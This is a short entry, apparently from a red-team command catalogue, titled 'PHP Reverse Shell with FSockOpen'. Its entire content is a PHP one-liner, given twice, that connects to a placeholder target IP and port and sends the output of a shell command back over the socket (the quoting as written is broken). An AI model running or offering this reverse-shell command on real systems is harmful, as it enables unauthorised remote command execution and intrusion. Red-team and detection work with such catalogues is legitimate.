---
id: a3194144-2849-409f-b777-a9f8a33a1511
name: PHP Reverse Shell with FSockOpen
type: command
executor: null
data: php -r '$sock=fsockopen("$_TARGET_IP",$_TARGET_PORT); fputs($sock, shell_exec('cmd'));'
output: null
created_at: '2019-09-17T19:34:48.768269+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PHP Reverse Shell with FSockOpen

```bash
php -r '$sock=fsockopen("$_TARGET_IP",$_TARGET_PORT); fputs($sock, shell_exec('cmd'));'
```
